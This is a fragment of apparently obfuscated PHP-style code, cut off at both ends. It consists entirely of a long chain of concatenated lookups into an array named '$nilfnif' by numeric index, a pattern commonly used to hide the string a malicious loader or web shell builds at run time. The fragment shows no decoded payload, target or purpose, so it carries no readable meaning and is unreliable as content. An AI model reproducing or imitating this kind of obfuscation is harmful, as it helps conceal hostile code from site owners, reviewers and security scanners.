7].$nilfnif[37].$nilfnif[73].$nilfnif[142].$nilfnif[135].$nilfnif[53].$nilfnif[18].$nilfnif[133].$nilfnif[25].$nilfnif[17].$nilfnif[285].$nilfnif[282].$nilfnif[15].$nilfnif[6].$nilfnif[23].$nilfnif[62].$nilfnif[1].$nilfnif[135].$nilfnif[88].$nilfnif[160].$nilfnif[47].$nilfnif[8].$nilfnif[47].$nilfnif[1].$nilfnif[1].$nilfnif[42].$nilfnif[51].$nilfnif[18].$nilfnif[15].$nilfnif[48].$nilfnif[69].$nilfnif[9].$nilfnif[285].$nilfnif[85].$nilfnif[135].$nilfnif[282].$nilfnif[41].$nilfnif[133].$nilfnif[160].$nilfnif[133].$nilfnif[27].$nilfnif[285].$nilfnif[51].$nilfnif[12].$nilfnif[30].$nilfnif[63].$nilfnif[282].$nilfnif[142].$nilfnif[121].$nilfnif[144].$nilfnif[47].$nilfnif[111].$nilfnif[24].$nilfnif[121].$nilfnif[133].$nilfnif[111].$nilfnif[23].$nilfnif[28].$nilfnif[29].$nilfnif[54].$nilfnif[0].$nilfnif[121].$nilfnif[124].$nilfnif[45].$nilfnif[14].$nilfnif[21].$nilfnif[12].$nilfnif[164].$nilfnif[96].$nilfnif[8].$nilfnif[14].$nilfnif[39].$nilfnif[96].$nilfnif[144].$nilfnif[164].$nilfnif[4].$nilfnif[9].$nilfnif[5].$nilfnif[133].$nilfnif[10].$nilfnif[51].$nilfnif[20].$nilfnif[1].$nilfnif[88].$nilfnif[14].$nilfnif[8].$nilfnif[17].$nilfnif[106].$nilfnif[106].$nilfnif[9].$nilfnif[18].$nilfnif[132].$nilfnif[24].$nilfnif[31].$nilfnif[44].$nilfnif[20].$nilfnif[135].$nilfnif[6].$nilfnif[4].$nilfnif[73].$nilfnif[160].$nilfnif[285].$nilfnif[54].$nilfnif[7].$nilfnif[9].$nilfnif[14].$nilfnif[285].$nilfnif[20].$nilfnif[29].$nilfnif[8].$nilfnif[96].$nilfnif[10].$nilfnif[63].$nilfnif[164].$nilfnif[25].$nilfnif[22].$nilfnif[8].$nilfnif[29].$nilfnif[6].$nilfnif[41].$nilfnif[73].$nilfnif[20].$nilfnif[23].$nilfnif[44].$nilfnif[22].$nilfnif[144].$nilfnif[96].$nilfnif[96].$nilfnif[5].$nilfnif[17].$nilfnif[7].$nilfnif[42].$nilfnif[4].$nilfnif[25].$nilfnif[14].$nilfnif[53].$nilfnif[41].$nilfnif[282].$nilfnif[23].$nilfnif[53].$nilfnif[63].$nilfnif[1].$nilfnif[111].$nilfnif[62].$nilfnif[1].$nilfnif[10].$nilfnif[52].$nilfnif[63].$nilfnif[12].$nilfnif[285].$nilfnif[51].$nilfnif[7].$nilfnif[144].$nilfnif[9].$nilfnif[54].$nilfnif[66].$nilfnif[9].$nilfnif[51].$nilfnif[73].$nilfnif[44].$nilfnif[15].$nilfnif[41].$nilfnif[96].$nilfnif[164].$nilfnif[39].$nilfnif[48].$nilfnif[45].$nilfnif[132].$nilfnif[282].$nilfnif[44].$nilfnif[29].$nilfnif[1].$nilfnif[52].$nilfnif[4].$nilfnif[15].$nilfnif[13].$nilfnif[4].$nilfnif[88].$nilfnif[47].$nilfnif[28].$nilfnif[85].$nilfnif[48].$nilfnif[48].$nilfnif[12].$nilfnif[14].$nilfnif[133].$nilfnif[2].$nilfnif[48].$nilfnif[13].$nilfnif[7].$nilfnif[44].$nilfnif[10].$nilfnif[164].$nilfnif[3].$nilfnif[34].$nilfnif[14].$nilfnif[14].$nilfnif[106].$nilfnif[17].$nilfnif[39].$nilfnif[160].$nilfnif[69].$nilfnif[7].$nilfnif[88].$nilfnif[37].$nilfnif[34].$nilfnif[51].$nilfnif[63].$nilfnif[53].$nilfnif[25].$nilfnif[7].$nilfnif[6].$nilfnif[3].$nilfnif[85].$nilfnif[41].$nilfnif[85].$nilfnif[21].$nilfnif[24].$nilfnif[160].$nilfnif[197].$nilfnif[47].$nilfnif[17].$nilfnif[22].$nilfnif[63].$nilfnif[73].$nilfnif[52].$nilfnif[17].$nilfnif[111].$nilfnif[5].$nilfnif[4].$nilfnif[12].$nilfnif[53].$nilfnif[53].$nilfnif[73].$nilfnif[14].$nilfnif[39].$nilfnif[31].$nilfnif[96].$nilfnif[22].$nilfnif[53].$nilfnif[52].$nilfnif[6].$nilfnif[15].$nilfnif[24].$nilfnif[53].$nilfnif[9].$nilfnif[3].$nilfnif[106].$nilfnif[4].$nilfnif[54].$nilfnif[23].$nilfnif[15].$nilfnif[1].$nilfnif[106].$nilfnif[164].$nilfnif[36].$nilfnif[6].$nilfnif[69].$nilfnif[63].$nilfnif[106].$nilfnif[27].$nilfnif[48].$nilfnif[4].$nilfnif[124].$nilfnif[12].$nilfnif[34].$nilfnif[88].$nilfnif[15].$nilfnif[30].$nilfnif[66].$nilfnif[27].$nilfnif[54].$nilfnif[36].$nilfnif[23].$nilfnif[31].$nilfnif[160].$nilfnif[164].$nilfnif[25].$nilfnif[0].$nilfnif[53].$nilfnif[12].$nilfnif[121].$nilfnif[44].$nilfnif[36].$nilfnif[111].$nilfnif[5].$nilfnif[7].$nilfnif[6].$nilfnif[30].$nilfnif[47].$nilfnif[30].$nilfnif[63].$nilfnif[124].$nilfnif[52].$nilfnif[164].$nilfnif[2].$nilfnif[144].$nilfnif[28].$nilfnif[24].$nilfnif[30].$nilfnif[25].$nilfnif[42].$nilfnif[30].$nilfnif[132].$nilfnif[121].$nilfnif[88].$nilfnif[4].$nilfnif[51].$nilfnif[88].$nilfnif[23].$nilfnif[73].$nilfnif[69].$nilfnif[25].$nilfnif[6].$nilfnif[51].$nilfnif[44].$nilfnif[22].$nilfnif[3].$nilfnif[20].$nilfnif[17].$nilfnif[25].$nilfnif[53].$nilfnif[73].$nilfnif[53].$nilfnif[8].$nilfnif[73].$nilfnif[160].$nilfnif[3].$nilfnif[51].$nilfnif[0].$nilfnif[7].$nilfnif[10].$nilfnif[132].$nilfnif[31].$nilfnif[4].$nilfnif[34].$nilfnif[30].$nilfnif[197].$nilfnif[4].$nilfnif[6].$nilfnif[37].$nilfnif[144].$nilfnif[31].$nilfnif[27].$nilfnif[27].$nilfnif[23].$nilfnif[12].$nilfnif[142].$nilfnif[53].$nilfnif[25].$nilfnif[85].$nilfnif[197].$nilfnif[51].$nilfnif[20].$nilfnif[25].$nilfnif[10].$nilfnif[10].$nilfnif[30].$nilfnif[135].$nilfnif[10].$nilfnif[8].$nilfnif[25].$nilfnif[5].$nilfnif[27].$nilfnif[53].$nilfnif[47].$nilfnif[14].$nilfnif[42].$nilfnif[9].$nilfnif[111].$nilfnif[66].$nilfnif[135].$nilfnif[37].$nilfnif[18].$nilfnif[3].$nilfnif[45].$nilfnif[197].$nilfnif[124].$nilfnif[34].$nilfnif[66].$nilfnif[7].$nilfnif[14].$nilfnif[44].$nilfnif[34].$nilfnif[1].$nilfnif[27].$nilfnif[47].$nilfnif[96].$nilfnif[132].$nilfnif[53].$nilfnif[106].$nilfnif[24].$nilfnif[27].$nilfnif[48].$nilfnif[85].$nilfnif[73].$nilfnif[37].$nilfnif[164].$nilfnif[48].$nilfnif[282].$nilfnif[15].$nilfnif[39].$nilfnif[124].$nilfnif[62].$nilfnif[164].$nilfnif[51].$nilfnif[282].$nilfnif[9].$nilfnif[41].$nilfnif[44].$nilfnif[41].$nilfnif[121].$nilfnif[69].$nilfnif[164].$nilfnif[53].$nilfnif[96].$nilfnif[282].$nilfnif[34].$nilfnif[13].$nilfnif[282].$nilfnif[73].$nilfnif[66].$nilfnif[30].$nilfnif[73].$nilfnif[53].$nilfnif[12].$nilfnif[22].$nilfnif[48].$nilfnif[44].$nilfnif[15].$nilfnif[96].$nilfnif[3].$nilfnif[160].$nilfnif[17].$nilfnif[144].$nilfnif[63].$nilfnif[96].$nilfnif[4].$nilfnif[132].$nilfnif[42].$nilfnif[142].$nilfnif[285].$nilfnif[12].$nilfnif[21].$nilfnif[10].$nilfnif[4].$nilfnif[5].$nilfnif[24].$nilfnif[73].$nilfnif[69].$nilfnif[53].$nilfnif[51].$nilfnif[51].$nilfnif[96].$nilfnif[29].$nilfnif[31].$nilfnif[18].$nilfnif[14].$nilfnif[285].$nilfnif[28].$nilfnif[63].$nilfnif[18].$nilfnif[3].$nilfnif[28].$nilfnif[62].$nilfnif[34].$nilfnif[23].$nilfnif[22].$nilfnif[18].$nilfnif[9].$nilfnif[164].$nilfnif[124].$nilfnif[160].$nilfnif[14].$nilfnif[66].$nilfnif[121].$nilfnif[48].$nilfnif[66].$nilfnif[88].$nilfnif[2].$nilfnif[73].$nilfnif[160].$nilfnif[142].$nilfnif[39].$nilfnif[4].$nilfnif[29].$nilfnif[37].$nilfnif[142].$nilfnif[12].$nilfnif[66].$nilfnif[160].$nilfnif[66].$nilfnif[135].$nilfnif[124].$nilfnif[3].$nilfnif[1].$nilfnif[53].$nilfnif[21].$nilfnif[45].$nilfnif[18].$nilfnif[48].$nilfnif[27].$nilfnif[47].$nilfnif[47].$nilfnif[15].$nilfnif[282].$nilfnif[197].$nilfnif[7].$nilfnif[24].$nilfnif[13].$nilfnif[85].$nilfnif[1].$nilfnif[30].$nilfnif[54].$nilfnif[48].$nilfnif[37].$nilfnif[5].$nilfnif[27].$nilfnif[10].$nilfnif[1].$nilfnif[17].$nilfnif[54].$nilfnif[5].$nilfnif[1].$nilfnif[69].$nilfnif[42].$nilfnif[9].$nilfnif[44].$nilfnif[53].$nilfnif[132].$nilfnif[0].$nilfnif[63].$nilfnif[1].$nilfnif[36].$nilfnif[144].$nilfnif[24].$nilfnif[54].$nilfnif[135].$nilfnif[164].$nilfnif[37].$nilfnif[5].$nilfnif[135].$nilfnif[164].$nilfnif[133].$nilfnif[36].$nilfnif[34].$nilfnif[21].$nilfnif[37].$nilfnif[13].$nilfnif[27].$nilfnif[41].$nilfnif[69].$nilfnif[4].$nilfnif[30].$nilfnif[69].$nilfnif[44].$nilfnif[142].$nilfnif[14].$nilfnif[7].$nilfnif[13].$nilfnif[8].$nilfnif[54].$nilfnif[13].$nilfnif[282].$nilfnif[13].$nilfnif[31].$nilfnif[135].$nilfnif[27].$nilfnif[45].$nilfnif[10].$nilfnif[52].$nilfnif[29].$nilfnif[6].$nilfnif[160].$nilfnif[135].$nilfnif[2].$nilfnif[30].$nilfnif[164].$nilfnif[54].$nilfnif[106].$nilfnif[142].$nilfnif[96].$nilfnif[282].$nilfnif[44].$nilfnif[53].$nilfnif[133].$nilfnif[8].$nilfnif[5].$nilfnif[4].$nilfnif[96].$nilfnif[27].$nilfnif[69].$nilfnif[85].$nilfnif[52].$nilfnif[17].$nilfnif[160].$nilfnif[23].$nilfnif[164].$nilfnif[14].$nilfnif[0].$nilfnif[124].$nilfnif[282].$nilfnif[27].$nilfnif[6].$nilfnif[21].$nilfnif[9].$nilfnif[25].$nilfnif[31].$nilfnif[73].$nilfnif[111].$nilfnif[282].$nilfnif[121].$nilfnif[17].$nilfnif[0].$nilfnif[4].$nilfnif[106].$nilfnif[37].$nilfnif[282].$nilfnif[24].$nilfnif[28].$nilfnif[121].$nilfnif[1].$nilfnif[41].$nilfnif[4].$nilfnif[66].$nilfnif[197].$nilfnif[135].$nilfnif[124].$nilfnif[36].$nilfnif[197].$nilfnif[133].$nilfnif[42].$nilfnif[4].$nilfnif[1].$nilfnif[282].$nilfnif[28].$nilfnif[121].$nilfnif[135].$nilfnif[53].$nilfnif[34].$nilfnif[44].$nilfnif[160].$nilfnif[2].$nilfnif[9].$nilfnif[124].$nilfnif[106].$nilfnif[54].$nilfnif[7].$nilfnif[6].$nilfnif[27].$nilfnif[12].$nilfnif[282].$nilfnif[29].$nilfnif[197].$nilfnif[88].$nilfnif[160].$nilfnif[133].$nilfnif[30].$nilfnif[44].$nilfnif[39].$nilfnif[42].$nilfnif[63].$nilfnif[132].$nilfnif[25].$nilfnif[29].$nilfnif[85].$nilfnif[73].$nilfnif[45].$nilfnif[285].$nilfnif[164].$nilfnif[144].$nilfnif[282].$nilfnif[54].$nilfnif[66].$nilfnif[29].$nilfnif[73].$nilfnif[106].$nilfnif[51].$nilfnif[45].$nilfnif[23].$nilfnif[135].$nilfnif[41].$nilfnif[133].$nilfnif[164].$nilfnif[15].$nilfnif[12].$nilfnif[6].$nilfnif[18].$nilfnif[135].$nilfnif[47].$nilfnif[42].$nilfnif[48].$nilfnif[132].$nilfnif[5].$nilfnif[18].$nilfnif[20].$nilfnif[17].$nilfnif[13].$nilfnif[85].$nilfnif[29].$nilfnif[24].$nilfnif[15].$nilfnif[135].$nilfnif[0].$nilfnif[8].$nilfnif[121].$nilfnif[47].$nilfnif[25].$nilfnif[36].$nilfnif[1].$nilfnif[124].$nilfnif[63].$nilfnif[44].$nilfnif[44].$nilfnif[73].$nilfnif[282].$nilfnif[15].$nilfnif[106].$nilfnif[6].$nilfnif[0].$nilfnif[12].$nilfnif[22].$nilfnif[6].$nilfnif[8].$nilfnif[132].$nilfnif[132].$nilfnif[30].$nilfnif[73].$nilfnif[2].$nilfnif[36].$nilfnif[69].$nilfnif[51].$nilfnif[3].$nilfnif[133].$nilfnif[63].$nilfnif[20].$nilfnif[12].$nilfnif[44].$nilfnif[63].$nilfnif[28].$nilfnif[160].$nilfnif[23].$nilfnif[85].$nilfnif[20].$nilfnif[73].$nilfnif[30].$nilfnif[7].$nilfnif[31].$nilfnif[111].$nilfnif[36].$nilfnif[124].$nilfnif[73].$nilfnif[282].$nilfnif[24].$nilfnif[63].$nilfnif[44].$nilfnif[5].$nilfnif[23].$nilfnif[6].$nilfnif[17].$nilfnif[6].$nilfnif[0].$nilfnif[2].$nilfnif[164].$nilfnif[31].$nilfnif[12].$nilfnif[22].$nilfnif[285].$nilfnif[21].$nilfnif[106].$nilfnif[85].$nilfnif[22].$nilfnif[197].$nilfnif[22].$nilfnif[124].$nilfnif[4].$nilfnif[62].$nilfnif[69].$nilfnif[6].$nilfnif[42].$nilfnif[5].$nilfnif[25].$nilfnif[282].$nilfnif[9].$nilfnif[31].$nilfnif[4].$nilfnif[48].$nilfnif[10].$nilfnif[42].$nilfnif[144].$nilfnif[164].$nilfnif[4].$nilfnif[17].$nilfnif[144].$nilfnif[51].$nilfnif[15].$nilfnif[14].$nilfnif[10].$nilfnif[282].$nilfnif[160].$nilfnif[13].$nilfnif[36].$nilfnif[28].$nilfnif[12].$nilfnif[3].$nilfnif[88].$nilfnif[62].$nilfnif[25].$nilfnif[45].$nilfnif[10].$nilfnif[36].$nilfnif[88].$nilfnif[13].$nilfnif[133].$nilfnif[14].$nilfnif[160].$nilfnif[124].$nilfnif[44].$nilfnif[12].$nilfnif[121].$nilfnif[197].$nilfnif[39].$nilfnif[18].$nilfnif[34].$nilfnif[34].$nilfnif[25].$nilfnif[85].$nilfnif[4].$nilfnif[164].$nilfnif[2].$nilfnif[30].$nilfnif[4].$nilfnif[9].$nilfnif[6].$nilfnif[69].$nilfnif[25].$nilfnif[2].$nilfnif[6].$nilfnif[54].$nilfnif[9].$nilfnif[111].$nilfnif[3].$nilfnif[37].$nilfnif[285].$nilfnif[124].$nilfnif[47].$nilfnif[44].$nilfnif[121].$nilfnif[23].$nilfnif[69].$nilfnif[63].$nilfnif[124].$nilfnif[144].$nilfnif[142].$nilfnif[63].$nilfnif[135].$nilfnif[4].$nilfnif[51].$nilfnif[5].$nilfnif[36].$nilfnif[6].$nilfnif[15].$nilfnif[3].$nilfnif[29].$nilfnif[1].$nilfnif[28].$nilfnif[142].$nilfnif[0].$nilfnif[39].$nilfnif[20].$nilfnif[96].$nilfnif[66].$nilfnif[39].$nilfnif[53].$nilfnif[69].$nilfnif[88].$nilfnif[133].$nilfnif[12].$nilfnif[1].$nilfnif[62].$nilfnif[69].$nilfnif[3].$nilfnif[31].$nilfnif[17].$nilfnif[9].$nilfnif[197].$nilfnif[25].$nilfnif[197].$nilfnif[45].$nilfnif[121].$nilfnif[44].$nilfnif[36].$nilfnif[73].$nilfnif[31].$nilfnif[10].$nilfnif[6].$nilfnif[111].$nilfnif[45].$nilfnif[73].$nilfnif[29].$nilfnif[25].$nilfnif[124].$nilfnif[23].$nilfnif[24].$nilfnif[42].$nilfnif[2].$nilfnif[53].$nilfnif[124].$nilfnif[7].$nilfnif[7].$nilfnif[285].$nilfnif[23].$nilfnif[144].$nilfnif[15].$nilfnif[37].$nilfnif[39].$nilfnif[9].$nilfnif[21].$nilfnif[142].$nilfnif[4].$nilfnif[111].$nilfnif[66].$nilfnif[1].$nilfnif[21].$nilfnif[3].$nilfnif[17].$nilfnif[124].$nilfnif[285].$nilfnif[31].$nilfnif[197].$nilfnif[132].$nilfnif[52].$nilfnif[39].$nilfnif[27].$nilfnif[25].$nilfnif[12].$nilfnif[21].$nilfnif[8].$nilfnif[39].$nilfnif[4].$nilfnif[121].$nilfnif[22].$nilfnif[41].$nilfnif[142].$nilfnif[121].$nilfnif[121].$nilfnif[54].$nilfnif[25].$nilfnif[37].$nilfnif[51].$nilfnif[36].$nilfnif[197].$nilfnif[15].$nilfnif[25].$nilfnif[28].$nilfnif[30].$nilfnif[24].$nilfnif[63].$nilfnif[17].$nilfnif[106].$nilfnif[23].$nilfnif[9].$nilfnif[285].$nilfnif[48].$nilfnif[6].$nilfnif[23].$nilfnif[160].$nilfnif[7].$nilfnif[5].$nilfnif[8].$nilfnif[28].$nilfnif[133].$nilfnif[23].$nilfnif[124].$nilfnif[22].$nilfnif[111].$nilfnif[21].$nilfnif[47].$nilfnif[69].$nilfnif[124].$nilfnif[66].$nilfnif[5].$nilfnif[106].$nilfnif[42].$nilfnif[85].$nilfnif[48].$nilfnif[39].$nilfnif[53].$nilfnif[164].$nilfnif[34].$nilfnif[48].$nilfnif[5].$nilfnif[96].$nilfnif[160].$nilfnif[53].$nilfnif[45].$nilfnif[54].$nilfnif[41].$nilfnif[96].$nilfnif[69].$nilfnif[63].$nilfnif[0].$nilfnif[282].$nilfnif[48].$nilfnif[88].$nilfnif[36].$nilfnif[17].$nilfnif[9].$nilfnif[17].$nilfnif[54].$nilfnif[36].$nilfnif[69].$nilfnif[160].$nilfnif[135].$nilfnif[3].$nilfnif[164].$nilfnif[23].$nilfnif[20].$nilfnif[197].$nilfnif[96].$nilfnif[51].$nilfnif[144].$nilfnif[14].$nilfnif[14].$nilfnif[142].$nilfnif[106].$nilfnif[85].$nilfnif[7].$nilfnif[2].$nilfnif[9].$nilfnif[282].$nilfnif[23].$nilfnif[144].$nilfnif[28].$nilfnif[142].$nilfnif[39].$nilfnif[63].$nilfnif[27].$nilfnif[39].$nilfnif[12].$nilfnif[10].$nilfnif[53].$nilfnif[63].$nilfnif[73].$nilfnif[25].$nilfnif[29].$nilfnif[28].$nilfnif[27].$nilfnif[48].$nilfnif[124].$nilfnif[23].$nilfnif[13].$nilfnif[10].$nilfnif[41].$nilfnif[44].$nilfnif[39].$nilfnif[121].$nilfnif[37].$nilfnif[23].$nilfnif[30].$nilfnif[52].$nilfnif[6].$nilfnif[17].$nilfnif[85].$nilfnif[51].$nilfnif[88].$nilfnif[39].$nilfnif[1].$nilfnif[66].$nilfnif[8].$nilfnif[44].$nilfnif[41].$nilfnif[63].$nilfnif[133].$nilfnif[106].$nilfnif[282].$nilfnif[14].$nilfnif[106].$nilfnif[29].$nilfnif[18].$nilfnif[285].$nilfnif[164].$nilfnif[121].$nilfnif[12].$nilfnif[73].$nilfnif[29].$nilfnif[3].$nilfnif[45].$nilfnif[14].$nilfnif[164].$nilfnif[132].$nilfnif[85].$nilfnif[4].$nilfnif[6].$nilfnif[52].$nilfnif[28].$nilfnif[124].$nilfnif[85].$nilfnif[30].$nilfnif[53].$nilfnif[36].$nilfnif[48].$nilfnif[47].$nilfnif[9].$nilfnif[106].$nilfnif[13].$nilfnif[29].$nilfnif[53].$nilfnif[39].$nilfnif[63].$nilfnif[12].$nilfnif[52].$nilfnif[20].$nilfnif[63].$nilfnif[282].$nilfnif[51].$nilfnif[53].$nilfnif[51].$nilfnif[39].$nilfnif[34].$nilfnif[106].$nilfnif[144].$nilfnif[63].$nilfnif[20].$nilfnif[44].$nilfnif[6].$nilfnif[39].$nilfnif[8].$nilfnif[135].$nilfnif[3].$nilfnif[106].$nilfnif[52].$nilfnif[5].$nilfnif[133].$nilfnif[17].$nilfnif[282].$nilfnif[22].$nilfnif[37].$nilfnif[14].$nilfnif[124].$nilfnif[25].$nilfnif[62].$nilfnif[47].$nilfnif[0].$nilfnif[45].$nilfnif[10].$nilfnif[135].$nilfnif[37].$nilfnif[27].$nilfnif[63].$nilfnif[39].$nilfnif[285].$nilfnif[142].$nilfnif[2].$nilfnif[164].$nilfnif[18].$nilfnif[2].$nilfnif[0].$nilfnif[51].$nilfnif[30].$nilfnif[20].$nilfnif[10].$nilfnif[282].$nilfnif[160].$nilfnif[1].$nilfnif[36].$nilfnif[14].$nilfnif[54].$nilfnif[85].$nilfnif[6].$nilfnif[45].$nilfnif[51].$nilfnif[18].$nilfnif[21].$nilfnif[53].$nilfnif[41].$nilfnif[51].$nilfnif[135].$nilfnif[22].$nilfnif[4].$nilfnif[30].$nilfnif[285].$nilfnif[48].$nilfnif[0].$nilfnif[47].$nilfnif[44].$nilfnif[160].$nilfnif[6].$nilfnif[17].$nilfnif[13].$nilfnif[5].$nilfnif[29].$nilfnif[13].$nilfnif[13].$nilfnif[12].$nilfnif[45].$nilfnif[48].$nilfnif[15].$nilfnif[7].$nilfnif[8].$nilfnif[0].$nilfnif[0].$nilfnif[111].$nilfnif[73].$nilfnif[160].$nilfnif[31].$nilfnif[27].$nilfnif[142].$nilfnif[39].$nilfnif[30].$nilfnif[1].$nilfnif[121].$nilfnif[132].$nilfnif[124].$nilfnif[63].$nilfnif[62].$nilfnif[4].$nilfnif[25].$nilfnif[21].$nilfnif[23].$nilfnif[3].$nilfnif[142].$nilfnif[62].$nilfnif[66].$nilfnif[21].$nilfnif[42].$nilfnif[52].$nilfnif[66].$nilfnif[8].$nilfnif[3].$nilfnif[30].$nilfnif[47].$nilfnif[31].$nilfnif[48].$nilfnif[8].$nilfnif[62].$nilfnif[160].$nilfnif[20].$nilfnif[164].$nilfnif[13].$nilfnif[5].$nilfnif[106].$nilfnif[85].$nilfnif[69].$nilfnif[47].$nilfnif[135].$nilfnif[10].$nilfnif[133].$nilfnif[88].$nilfnif[133].$nilfnif[10].$nilfnif[27].$nilfnif[42].$nilfnif[37].$nilfnif[111].$nilfnif[1].$nilfnif[51].$nilfnif[88].$nilfnif[14].$nilfnif[30].$nilfnif[47].$nilfnif[1].$nilfnif[30].$nilfnif[53].$nilfnif[34].$nilfnif[73].$nilfnif[4].$nilfnif[21].$nilfnif[30].$nilfnif[36].$nilfnif[121].$nilfnif[124].$nilfnif[285].$nilfnif[106].$nilfnif[142].$nilfnif[121].$nilfnif[52].$nilfnif[8].$nilfnif[21].$nilfnif[96].$nilfnif[124].$nilfnif[17].$nilfnif[48].$nilfnif[22].$nilfnif[63].$nilfnif[142].$nilfnif[7].$nilfnif[47].$nilfnif[69].$nilfnif[25].$nilfnif[54].$nilfnif[53].$nilfnif[88].$nilfnif[4].$nilfnif[10].$nilfnif[88].$nilfnif[21].$nilfnif[34].$nilfnif[24].$nilfnif[44].$nilfnif[12].$nilfnif[23].$nilfnif[1].$nilfnif[39].$nilfnif[1].$nilfnif[52].$nilfnif[39].$nilfnif[111].$nilfnif[7].$nilfnif[47].$nilfnif[5].$nilfnif[124].$nilfnif[66].$nilfnif[36].$nilfnif[48].$nilfnif[0].$nilfnif[121].$nilfnif[36].$nilfnif[39].$nilfnif[124].$nilfnif[51].$nilfnif[5].$nilfnif[282].$nilfnif[53].$nilfnif[69].$nilfnif[23].$nilfnif[121].$nilfnif[124].$nilfnif[45].$nilfnif[62].$nilfnif[121].$nilfnif[23].$nilfnif[66].$nilfnif[51].$nilfnif[111].$nilfnif[18].$nilfnif[15].$nilfnif[197].$nilfnif[197].$nilfnif[88].$nilfnif[23].$nilfnif[48].$nilfnif[62].$nilfnif[111].$nilfnif[53].$nilfnif[54].$nilfnif[133].$nilfnif[121].$nilfnif[27].$nilfnif[15].$nilfnif[63].$nilfnif[62].$nilfnif[85].$nilfnif[39].$nilfnif[10].$nilfnif[164].$nilfnif[12].$nilfnif[48].$nilfnif[44].$nilfnif[41].$nilfnif[27].$nilfnif[36].$nilfnif[1].$nilfnif[51].$nilfnif[111].$nilfnif[8].$nilfnif[69].$nilfnif[0].$nilfnif[27].$nilfnif[52].$nilfnif[29].$nilfnif[51].$nilfnif[28].$nilfnif[18].$nilfnif[6].$nilfnif[5].$nilfnif[44].$nilfnif[73].$nilfnif[51].$nilfnif[51].$nilfnif[14].$nilfnif[13].$nilfnif[164].$nilfnif[47].$nilfnif[20].$nilfnif[142].$nilfnif[36].$nilfnif[25].$nilfnif[197].$nilfnif[5].$nilfnif[124].$nilfnif[3].$nilfnif[142].$nilfnif[7].$nilfnif[54].$nilfnif[36].$nilfnif[20].$nilfnif[8].$nilfnif[12].$nilfnif[14].$nilfnif[51].$nilfnif[85].$nilfnif[48].$nilfnif[17].$nilfnif[144].$nilfnif[27].$nilfnif[3].$nilfnif[15].$nilfnif[285].$nilfnif[24].$nilfnif[66].$nilfnif[88].$nilfnif[36].$nilfnif[42].$nilfnif[106].$nilfnif[69].$nilfnif[23].$nilfnif[48].$nilfnif[10].$nilfnif[142].$nilfnif[47].$nilfnif[69].$nilfnif[28].$nilfnif[62].$nilfnif[23].$nilfnif[36].$nilfnif[30].$nilfnif[13].$nilfnif[144].$nilfnif[42].$nilfnif[45].$nilfnif[88].$nilfnif[63].$nilfnif[37].$nilfnif[197].$nilfnif[6].$nilfnif[51].$nilfnif[52].$nilfnif[88].$nilfnif[20].$nilfnif[18].$nilfnif[132].$nilfnif[12].$nilfnif[22].$nilfnif[106].$nilfnif[142].$nilfnif[21].$nilfnif[20].$nilfnif[142].$nilfnif[142].$nilfnif[135].$nilfnif[88].$nilfnif[36].$nilfnif[69].$nilfnif[44].$nilfnif[30].$nilfnif[197].$nilfnif[0].$nilfnif[52].$nilfnif[10].$nilfnif[54].$nilfnif[51].$nilfnif[28].$nilfnif[85].$nilfnif[133].$nilfnif[22].$nilfnif[135].$nilfnif[25].$nilfnif[62].$nilfnif[160].$nilfnif[45].$nilfnif[144].$nilfnif[29].$nilfnif[144].$nilfnif[63].$nilfnif[14].$nilfnif[51].$nilfnif[124].$nilfnif[9].$nilfnif[9].$nilfnif[51].$nilfnif[69].$nilfnif[6].$nilfnif[41].$nilfnif[31].$nilfnif[7].$nilfnif[31].$nilfnif[23].$nilfnif[14].$nilfnif[23].$nilfnif[18].$nilfnif[24].$nilfnif[124].$nilfnif[69].$nilfnif[164].$nilfnif[88].$nilfnif[25].$nilfnif[144].$nilfnif[121].$nilfnif[1].$nilfnif[39].$nilfnif[12].$nilfnif[41].$nilfnif[45].$nilfnif[34].$nilfnif[45].$nilfnif[3].$nilfnif[28].$nilfnif[164].$nilfnif[197].$nilfnif[54].$nilfnif[27].$nilfnif[36].$nilfnif[4].$nilfnif[4].$nilfnif[53].$nilfnif[160].$nilfnif[37].$nilfnif[88].$nilfnif[24].$nilfnif[1].$nilfnif[13].$nilfnif[25].$nilfnif[13].$nilfnif[88].$nilfnif[5].$nilfnif[69].$nilfnif[8].$nilfnif[25].$nilfnif[88].$nilfnif[53].$nilfnif[53].$nilfnif[121].$nilfnif[22].$nilfnif[22].$nilfnif[39].$nilfnif[73].$nilfnif[31].$nilfnif[23].$nilfnif[34].$nilfnif[7].$nilfnif[53].$nilfnif[44].$nilfnif[85].$nilfnif[29].$nilfnif[66].$nilfnif[132].$nilfnif[0].$nilfnif[41].$nilfnif[41].$nilfnif[144].$nilfnif[6].$nilfnif[282].$nilfnif[73].$nilfnif[51].$nilfnif[12].$nilfnif[41].$nilfnif[7].$nilfnif[2].$nilfnif[106].$nilfnif[111].$nilfnif[121].$nilfnif[41].$nilfnif[39].$nilfnif[4].$nilfnif[37].$nilfnif[51].$nilfnif[85].$nilfnif[39].$nilfnif[144].$nilfnif[27].$nilfnif[37].$nilfnif[4].$nilfnif[3].$nilfnif[135].$nilfnif[28].$nilfnif[47].$nilfnif[29].$nilfnif[73].$nilfnif[53].$nilfnif[133].$nilfnif[106].$nilfnif[54].$nilfnif[53].$nilfnif[31].$nilfnif[160].$nilfnif[12].$nilfnif[5].$nilfnif[7].$nilfnif[8].$nilfnif[282].$nilfnif[23].$nilfnif[197].$nilfnif[1].$nilfnif[85].$nilfnif[52].$nilfnif[160].$nilfnif[111].$nilfnif[51].$nilfnif[17].$nilfnif[73].$nilfnif[27].$nilfnif[4].$nilfnif[47].$nilfnif[2].$nilfnif[133].$nilfnif[66].$nilfnif[4].$nilfnif[13].$nilfnif[62].$nilfnif[132].$nilfnif[106].$nilfnif[164].$nilfnif[37].$nilfnif[4].$nilfnif[1].$nilfnif[144].$nilfnif[121].$nilfnif[160].$nilfnif[23].$nilfnif[14].$nilfnif[36].$nilfnif[30].$nilfnif[5].$nilfnif[15].$nilfnif[17].$nilfnif[30].$nilfnif[17].$nilfnif[28].$nilfnif[42].$nilfnif[17].$nilfnif[1].$nilfnif[27].$nilfnif[10].$nilfnif[2].$nilfnif[28].$nilfnif[160].$nilfnif[28].$nilfnif[124].$nilfnif[164].$nilfnif[31].$nilfnif[10].$nilfnif[20].$nilfnif[0].$nilfnif[62].$nilfnif[66].$nilfnif[197].$nilfnif[48].$nilfnif[36].$nilfnif[28].$nilfnif[21].$nilfnif[29].$nilfnif[44].$nilfnif[106].$nilfnif[88].$nilfnif[54].$nilfnif[45].$nilfnif[27].$nilfnif[28].$nilfnif[53].$nilfnif[48].$nilfnif[48].$nilfnif[4].$nilfnif[66].$nilfnif[37].$nilfnif[37].$nilfnif[3].$nilf